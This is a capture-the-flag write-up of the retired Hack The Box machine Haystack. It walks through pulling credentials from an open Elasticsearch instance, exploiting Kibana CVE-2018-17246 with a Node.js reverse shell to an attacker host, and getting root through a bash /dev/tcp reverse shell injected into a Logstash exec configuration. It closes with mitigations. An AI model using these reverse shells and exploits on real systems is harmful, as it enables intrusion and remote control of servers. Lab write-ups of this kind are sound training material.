---
machine: Haystack
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, elasticsearch, kibana, logstash, privesc]
---

# Haystack — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The website image contains a base64 string with the clue “the needle in the haystack is key”. Elasticsearch on `9200` exposes the `quotes` and `bank` indexes; two documents in `quotes` hold a base64 username and password. Those credentials give SSH as `security`. Kibana listens on `localhost:5601` and is vulnerable to CVE-2018-17246: an API path loaded as JavaScript executes a local file. The shell runs as `kibana`, whose group can read the Logstash configuration; Logstash runs as root and executes a log field, allowing a root reverse shell.

## Recon

```bash
nmap -Pn -sCV -p22,80,9200 <IP>
```

- `22` OpenSSH 7.4.
- `80` nginx 1.12.2 serving a single image, `needle.jpg`.
- `9200` Elasticsearch.

```bash
strings -n 20 needle.jpg | tail -1 | base64 -d
# la aguja en el pajar es "clave"
```

The `quotes` index holds the clue; `bank` is noise. Web enumeration finds no additional paths.

## Enumeration

```bash
curl -s http://<IP>:9200/_cat/indices?v
curl -s -X GET 'http://<IP>:9200/quotes/_search?size=1000' \
  -H 'Content-Type: application/json' \
  -d '{"query":{"match_all":{}}}' | jq -c '.hits.hits[]'
```

Two documents contain base64 values that decode to `user: security` and `pass: <PASSWORD>`. The credentials work over SSH:

```bash
ssh security@<IP>
```

`netstat` is not installed; `/proc/net/tcp` shows a listener on `127.0.0.1:5601` (Kibana). Forward it over SSH.

## Foothold

Kibana 6.x is vulnerable to CVE-2018-17246: the `apis` parameter loads a local file as JavaScript. Write a Node reverse shell to `/dev/shm/0xdf.js` and request the path:

```bash
curl -s 'http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../dev/shm/0xdf.js'
```

The shell runs as `kibana`:

```javascript
(function(){
  var net = require("net"), cp = require("child_process"),
      sh = cp.spawn("/bin/sh", []);
  var client = new net.Socket();
  client.connect(443, "<ATTACKER>", function(){
    client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client);
  });
  return /a/;
})();
```

## Lateral movement

`security` → `kibana` is the only hop. The `kibana` account belongs to the group of the same name, which can read `/etc/logstash/conf.d/`.

## Privilege escalation

Logstash runs as root. Its configuration chains three files:

- `input.conf` reads `/opt/kibana/logstash_*` every 10 seconds and tags events as `execute`.
- `filter.conf` applies a `grok` to `Ejecutar comando: <text>` and stores the rest in `comando`.
- `output.conf` runs `%{comando} &` through the `exec` plugin.

Write a valid line into the watched directory:

```bash
echo "Ejecutar comando: bash -c 'bash -i >& /dev/tcp/<ATTACKER>/443 0>&1'" \
  > /opt/kibana/logstash_0xdf
```

A shell with UID 0 arrives within seconds.

## Evidence

- Base64 string from `needle.jpg`.
- Elasticsearch indexes and documents with the username/password.
- SSH access as `security`.
- `127.0.0.1:5601` listener in `/proc/net/tcp`.
- Shell as `kibana` after loading the JS.
- Logstash configuration files and a root shell.

## Lessons learned

- Visual clues and image metadata are enumeration too.
- Unauthenticated Elasticsearch exposes data and credentials for other services.
- An LFI that loads JavaScript is code execution, not just file read.
- The configuration of a root service can turn a log line into a shell.

## Mitigations and detection

- Require authentication for Elasticsearch and never index credentials.
- Update Kibana, restrict `/api/console/api_server` and do not load user-controlled paths.
- Run Logstash as an unprivileged user and avoid the `exec` plugin on untrusted fields.
- Restrict reads of `/etc/logstash/conf.d` to the service account.
- Detect `apis=../../` requests, Node processes opening sockets and `logstash_*` files created outside the normal flow.

## References

- [0xdf — Haystack](https://0xdf.gitlab.io/2019/11/02/htb-haystack.html)
- [IppSec — Haystack](https://www.youtube.com/watch?v=oGO9MEIz_tI)
- [NVD — CVE-2018-17246](https://nvd.nist.gov/vuln/detail/CVE-2018-17246)
- [Hack The Box — Haystack](https://app.hackthebox.com/machines/haystack)
